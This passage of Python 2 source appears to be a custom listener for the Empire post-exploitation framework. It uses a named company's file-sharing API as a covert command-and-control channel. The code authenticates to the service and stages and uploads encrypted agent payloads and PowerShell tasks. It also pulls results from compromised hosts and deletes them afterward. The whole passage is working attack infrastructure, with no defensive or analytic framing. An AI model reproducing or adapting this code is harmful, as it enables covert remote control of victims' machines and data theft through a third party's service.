                signal = json.dumps({
                    'print' : True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))

        listener_options = copy.deepcopy(listenerOptions)

        listener_name = listener_options['Name']['Value']
        staging_key = listener_options['StagingKey']['Value']
        poll_interval = listener_options['PollInterval']['Value']
        username = listener_options['Username']['Value']
        password = listener_options['Password']['Value']
        signature = listener_options['Signature']['Value']
        base_folder = listener_options['BaseFolder']['Value']
        staging_folder = listener_options['StagingFolder']['Value'].strip('/')
        taskings_folder = listener_options['TaskingsFolder']['Value'].strip('/')
        results_folder = listener_options['ResultsFolder']['Value'].strip('/')
        base_url = "http://wizard.pingan.com.cn"
        workspaces = {}
        staging_files = {}
        tasking_files = {}
        result_files = {}

        proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

        s = Session()

        token = get_token(username, password, signature)
        message = "[*] Got new auth token"
        signal = json.dumps({
            'print' : True,
            'message': message
        })
        dispatcher.send(signal, sender="listeners/wizard")

        s.cookies.set('ws_auth',token['tokenCas'])

        setup_folders()
        check_staging_files()

        while True:
            #Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
            try:
                if listener_name in self.mainMenu.listeners.activeListeners.keys():
                    self.mainMenu.listeners.activeListeners[listener_name]['options']['Token'] = token['tokenCas']
                    self.mainMenu.listeners.update_listener_options(listener_name, "Token", token['tokenCas'])
                    upload_stager()
                    upload_launcher()
                    break
                else:
                    time.sleep(1)
            except AttributeError:
                time.sleep(1)
 
        while True:
            time.sleep(int(poll_interval))
            try: #Wrap the whole loop in a try/catch so one error won't kill the listener
                if not test_token(token['tokenCas']): #Get a new token if the current one has expired
                    token = get_token(username, password, signature)
                    self.mainMenu.listeners.update_listener_options(listener_name, "Token", token['tokenCas'])
                    s.cookies.set('ws_auth',token['tokenCas'])
                    message = "[*] Refreshed auth token"
                    signal = json.dumps({
                        'print' : True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                    upload_stager()

                search = s.get("%s/alm/file/api_p2/?list&projectId=%s" % (base_url, workspaces[staging_folder]),proxies = proxies)
                for item in search.json()['rows']: #Iterate all items in the staging folder
                    try:
                        reg = re.search("^([A-Z0-9]+).txt", item['name'])
                        if not reg:
                            continue
                        agent_name = reg.groups()[0]
                        stage,content = s.get(item['url'],proxies = proxies).content.split('||')
                        #print stage
                        if stage == '1': #Download stage 1, upload stage 2
                            message = "[*] Downloading {}/{}".format(staging_folder, item['name'], item['size'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            #content = s.get(item['url']).content
                            content = base64.b64decode(content)
                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                            message = "[*] Uploading {}/{}_2.txt, {} bytes".format(staging_folder, agent_name, str(len(return_val)))
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            '''file={
                                'fileName':('%s_2.txt' % agent_name, return_val,'application/octet-stream'),
                                'projectId':(None,workspaces[staging_folder],None),
                            }
                            s.post("%s/alm/file?upload" % base_url, file=file)'''
                            data={
                                'title': agent_name,
                                'content':'2||'+base64.b64encode(return_val),
                                'fileType':'txt',
                                'id':item['id'],
                            }
                            s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)

                            
                            message = "[*] Deleting {}/{}".format( staging_folder, item['name'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            #s.delete("%s/alm/file/%s?delete" % (base_url, item['id']))

                        if stage == '3': #Download stage 3, upload stage 4 (full agent code)
                            message = "[*] Downloading {}/{}/{}, {} bytes".format(base_folder, staging_folder, item['name'], item['size'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            content = base64.b64decode(content)
                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                            #print self.mainMenu.agents.agents
                            session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
                            #agent_token = renew_token(client_id, client_secret, token['refresh_token']) #Get auth and refresh tokens for the agent to use
                            agent_token = token
                            agent_code = str(self.generate_agent(listener_options, username, password, agent_token['tokenCas'],
                                                            agent_token['tokenCas'], lang))
                            enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)

                            message = "[*] Uploading {}/{}/{}_4.txt, {} bytes".format(base_folder, staging_folder, agent_name, str(len(enc_code)))
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            '''file={
                                'fileName':('%s_4.txt' % agent_name, enc_code,'application/octet-stream'),
                                'projectId':(None,workspaces[staging_folder],None),
                            }
                            s.post("%s/alm/file?upload" % base_url, file=file)'''
                            data={
                                'title': agent_name,
                                'content':'4||'+base64.b64encode(enc_code),
                                'fileType':'txt',
                                'id':item['id'],
                            }
                            #print params
                            s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)

                            
                            message = "[*] Deleting {}/{}/{}".format(base_folder, staging_folder, item['name'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            #s.delete("%s/alm/file/%s?delete" % (base_url, item['id']))

                    except Exception, e:
                        print helpers.color("[!] Could not handle agent staging for listener %s, continuing" % listener_name)
                        message = traceback.format_exc()
                        print message
                        signal = json.dumps({
                            'print': False,
                            'message': message
                        })
                        dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))

                #agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
                #refresh tasking_files
                check_tasking_files()
                agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
                for agent_id in agent_ids: #Upload any tasks for the current agents
                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
                    if task_data:
                        try:
                            tasking_file_id = None
                            if tasking_files.get(agent_id,None):
                                r = s.get(tasking_files[agent_id]['url'])
                                tasking_file_id = tasking_files[agent_id]['id']
                                task_data = base64.b64decode(r.content) + task_data

                            message = "[*] Uploading agent tasks for {}, {} bytes".format(agent_id, str(len(task_data)))
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            data={
                                'title':agent_id,
                                'content':base64.b64encode(task_data),
                                'fileType':'txt',
                                'id': tasking_file_id,
                            }
                            s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[taskings_folder]), data=data,proxies = proxies)
                        except Exception, e:
                            message = "[!] Error uploading agent tasks for {}, {}".format(agent_id, e)
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))

                check_result_files()
                for item in result_files.values(): #For each file in the results folder
                    try:
                        agent_id = item['name'].split(".")[0]
                        if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
                            print helpers.color("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name']))
                            data='RESTAGE'
                            #s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[taskings_folder]), data=data,proxies = proxies)
                            #s.delete("%s/drive/items/%s" % (base_url, item['id']),proxies = proxies)
                            s.delete("%s/alm/file/%s?delete" % (base_url, item['id']),proxies = proxies)
                            continue

                        seen_time = datetime.strptime(item['createdDate'], "%Y-%m-%d %H:%M:%S")
                        #seen_time = helpers.utc_to_local(seen_time)
                        self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)

                        #If the agent is just checking in, the file will only be 1 byte, so no results to fetch
                        if(item['size'] > 4):
                            message = "[*] Downloading results from {}/{}, {} bytes".format(results_folder, item['name'], item['size'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            r = s.get(item['url'],proxies = proxies)
                            self.mainMenu.agents.handle_agent_data(staging_key, base64.b64decode(r.content), listener_options, update_lastseen=False)
                            message = "[*] Deleting {}/{}".format(results_folder, item['name'])
                            signal = json.dumps({
                                'print': False,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
                            s.delete("%s/alm/file/%s?delete" % (base_url, item['id']),proxies = proxies)
                    except Exception, e:
                        message = "[!] Error handling agent results for {}, {}".format(item['name'], e)
                        print message
                        signal = json.dumps({
                            'print': False,
                            'message': message
                        })
                        dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))

            except Exception, e:
                print helpers.color("[!] Something happened in listener %s: %s, continuing" % (listener_name, e))
                message = traceback.format_exc()
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))

            s.close()


    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.

        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()


    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))
            self.threads[name].kill()
        else:
            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
            self.threads[self.options['Name']['Value']].kill()

